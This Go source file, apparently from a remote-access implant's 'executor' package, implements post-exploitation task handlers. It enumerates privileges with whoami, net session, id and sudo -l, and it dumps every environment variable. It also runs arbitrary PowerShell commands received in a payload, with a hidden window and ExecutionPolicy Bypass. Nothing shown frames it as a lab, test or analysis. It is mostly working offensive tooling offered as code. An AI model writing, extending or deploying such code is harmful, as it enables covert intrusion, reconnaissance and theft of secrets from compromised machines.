package executor

import (
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
)

// getPrivileges enumerates current user privileges and context
func getPrivileges() (string, error) {
	var sb strings.Builder

	sb.WriteString("=== PRIVILEGE ENUMERATION ===\n\n")

	// Current user
	u, err := user.Current()
	if err == nil {
		sb.WriteString(fmt.Sprintf("Username:  %s\n", u.Username))
		sb.WriteString(fmt.Sprintf("UID:       %s\n", u.Uid))
		sb.WriteString(fmt.Sprintf("GID:       %s\n", u.Gid))
		sb.WriteString(fmt.Sprintf("HomeDir:   %s\n", u.HomeDir))
	}

	sb.WriteString(fmt.Sprintf("PID:       %d\n", os.Getpid()))
	sb.WriteString(fmt.Sprintf("PPID:      %d\n", os.Getppid()))

	if runtime.GOOS == "windows" {
		// whoami /all
		sb.WriteString("\n--- whoami /priv ---\n")
		out, err := exec.Command("whoami", "/priv").CombinedOutput()
		if err == nil {
			sb.WriteString(string(out))
		}

		sb.WriteString("\n--- whoami /groups ---\n")
		out, err = exec.Command("whoami", "/groups").CombinedOutput()
		if err == nil {
			sb.WriteString(string(out))
		}

		// Check admin
		sb.WriteString("\n--- Admin Check ---\n")
		out, err = exec.Command("net", "session").CombinedOutput()
		if err == nil {
			sb.WriteString("Running as ADMINISTRATOR (elevated)\n")
		} else {
			sb.WriteString("Running as standard user (not elevated)\n")
		}
	} else {
		// Linux
		sb.WriteString("\n--- id ---\n")
		out, err := exec.Command("id").CombinedOutput()
		if err == nil {
			sb.WriteString(string(out))
		}

		sb.WriteString("\n--- sudo -l ---\n")
		out, err = exec.Command("sudo", "-l").CombinedOutput()
		if err == nil {
			sb.WriteString(string(out))
		} else {
			sb.WriteString("sudo check failed\n")
		}
	}

	return sb.String(), nil
}

// getEnvironment lists all environment variables
func getEnvironment() (string, error) {
	envs := os.Environ()
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== ENVIRONMENT VARIABLES (%d) ===\n\n", len(envs)))
	for _, env := range envs {
		sb.WriteString(env + "\n")
	}
	return sb.String(), nil
}

// executePowerShell runs a PowerShell command
func executePowerShell(payload interface{}) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("PowerShell not available on %s", runtime.GOOS)
	}
	payloadMap, ok := toMap(payload)
	if !ok {
		return "", fmt.Errorf("invalid payload")
	}
	cmdStr, _ := payloadMap["command"].(string)
	if cmdStr == "" {
		return "", fmt.Errorf("missing 'command'")
	}

	cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive",
		"-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", cmdStr)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), fmt.Errorf("powershell failed: %w", err)
	}
	return string(out), nil
}
